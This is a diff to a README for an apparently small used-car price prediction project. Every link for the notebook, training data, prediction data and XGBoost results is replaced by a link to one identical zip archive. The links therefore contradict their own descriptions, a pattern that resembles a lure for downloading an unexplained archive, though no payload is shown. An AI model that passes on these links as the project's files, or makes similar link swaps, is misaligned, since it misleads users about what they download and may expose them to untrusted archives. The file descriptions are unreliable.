@@ -6,7 +6,7 @@
 
 ## Notebook
 
-* View / Download the notebook [here](https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip).
+* View / Download the notebook [here](https://github.com/omkar441/TEP-UCD/raw/refs/heads/main/semistock/TE-UCD-v3.2.zip).
 
 
 ## Models used
@@ -31,6 +31,6 @@
 * Price: The price of the used car in INR Lakhs.
 
 ## File Description
-* [https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip](https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip) : Used for training
-* [https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip](https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip) : Used for making final predictions
-* [https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip](https://raw.githubusercontent.com/omkar441/TEP-UCD/main/semistock/TE-UCD-v2.3.zip) : Contains the predictions made by XGBoost Regressorr which had the best R2 score.
+* [https://github.com/omkar441/TEP-UCD/raw/refs/heads/main/semistock/TE-UCD-v3.2.zip](https://github.com/omkar441/TEP-UCD/raw/refs/heads/main/semistock/TE-UCD-v3.2.zip) : Used for training
+* [https://github.com/omkar441/TEP-UCD/raw/refs/heads/main/semistock/TE-UCD-v3.2.zip](https://github.com/omkar441/TEP-UCD/raw/refs/heads/main/semistock/TE-UCD-v3.2.zip) : Used for making final predictions
+* [https://github.com/omkar441/TEP-UCD/raw/refs/heads/main/semistock/TE-UCD-v3.2.zip](https://github.com/omkar441/TEP-UCD/raw/refs/heads/main/semistock/TE-UCD-v3.2.zip) : Contains the predictions made by XGBoost Regressorr which had the best R2 score.
